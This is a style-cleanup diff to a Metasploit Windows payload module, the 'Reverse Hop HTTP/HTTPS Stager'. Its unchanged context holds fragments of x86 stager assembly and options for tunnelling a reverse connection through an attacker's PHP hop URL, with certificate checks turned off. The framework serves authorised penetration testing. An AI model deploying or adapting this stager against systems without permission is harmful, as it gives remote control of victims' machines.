@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -8,7 +9,6 @@ require 'msf/core'
 require 'msf/core/handler/reverse_hop_http'
 
 module MetasploitModule
-
   CachedSize = 353
 
   include Msf::Payload::Stager
@@ -16,30 +16,29 @@ module MetasploitModule
 
   def initialize(info = {})
     super(merge_info(info,
-      'Name'           => 'Reverse Hop HTTP/HTTPS Stager',
-      'Description'    => %q{
-        Tunnel communication over an HTTP or HTTPS hop point. Note that you must first upload
-        data/hop/hop.php to the PHP server you wish to use as a hop.
-      },
-      'Author'         => [
-         'scriptjunkie <scriptjunkie[at]scriptjunkie.us>',
-         'bannedit',
-         'hdm'
-        ],
-      'License'        => MSF_LICENSE,
-      'Platform'       => 'win',
-      'Arch'           => ARCH_X86,
-      'Handler'        => Msf::Handler::ReverseHopHttp,
-      'Convention'     => 'sockedi http',
-      'DefaultOptions' => { 'WfsDelay' => 30 },
-      'Stager'         => { 'Offsets' => { } }))
+                     'Name'           => 'Reverse Hop HTTP/HTTPS Stager',
+                     'Description'    => %q(
+                       Tunnel communication over an HTTP or HTTPS hop point. Note that you must first upload
+                       data/hop/hop.php to the PHP server you wish to use as a hop.
+                     ),
+                     'Author' => [
+                       'scriptjunkie <scriptjunkie[at]scriptjunkie.us>',
+                       'bannedit',
+                       'hdm'
+                     ],
+                     'License'        => MSF_LICENSE,
+                     'Platform'       => 'win',
+                     'Arch'           => ARCH_X86,
+                     'Handler'        => Msf::Handler::ReverseHopHttp,
+                     'Convention'     => 'sockedi http',
+                     'DefaultOptions' => { 'WfsDelay' => 30 },
+                     'Stager'         => { 'Offsets' => {} }))
 
     deregister_options('LHOST', 'LPORT')
 
     register_options([
-      OptString.new('HOPURL', [ true, "The full URL of the hop script", "http://example.com/hop.php" ]
-      )
-    ], self.class)
+                       OptString.new('HOPURL', [ true, "The full URL of the hop script", "http://example.com/hop.php" ])
+                     ], self.class)
   end
 
   #
@@ -52,7 +51,7 @@ module MetasploitModule
   #
   # Generate the transport-specific configuration
   #
-  def transport_config(opts={})
+  def transport_config(opts = {})
     config = transport_config_reverse_http(opts)
     config[:scheme] = URI(datastore['HOPURL']).scheme
     config
@@ -63,7 +62,7 @@ module MetasploitModule
   #
   def generate
     uri = URI(datastore['HOPURL'])
-    #create actual payload
+    # create actual payload
     payload_data = <<EOS
   cld            ; clear direction flag
   call start        ; start main routine
@@ -200,11 +199,11 @@ httpopenrequest:
   push edx               ; dwContext (NULL)
 EOS
 
-    if uri.scheme == 'http'
-      payload_data << '  push (0x80000000 | 0x04000000 | 0x00200000 | 0x00000200 | 0x00400000) ; dwFlags'
-    else
-      payload_data << '  push (0x80000000 | 0x00800000 | 0x00001000 | 0x00002000 | 0x04000000 | 0x00200000 | 0x00000200 | 0x00400000) ; dwFlags'
-    end
+    payload_data << if uri.scheme == 'http'
+                      '  push (0x80000000 | 0x04000000 | 0x00200000 | 0x00000200 | 0x00400000) ; dwFlags'
+                    else
+                      '  push (0x80000000 | 0x00800000 | 0x00001000 | 0x00002000 | 0x04000000 | 0x00200000 | 0x00000200 | 0x00400000) ; dwFlags'
+                    end
     # 0x80000000 |        ; INTERNET_FLAG_RELOAD
     # 0x00800000 |        ; INTERNET_FLAG_SECURE
     # 0x00001000 |        ; INTERNET_FLAG_IGNORE_CERT_CN_INVALID
@@ -266,7 +265,7 @@ set_security_options:
 
 EOS
   end
-  payload_data << <<EOS
+    payload_data << <<EOS
   jmp.i8 httpsendrequest
 
 dbl_get_server_host:
@@ -324,7 +323,7 @@ server_host:
 db "#{Rex::Text.hexify(uri.host, 99999).strip}", 0x00
 
 EOS
-    self.module_info['Stager']['Assembly'] = payload_data.to_s
+    module_info['Stager']['Assembly'] = payload_data.to_s
     super
   end
 end
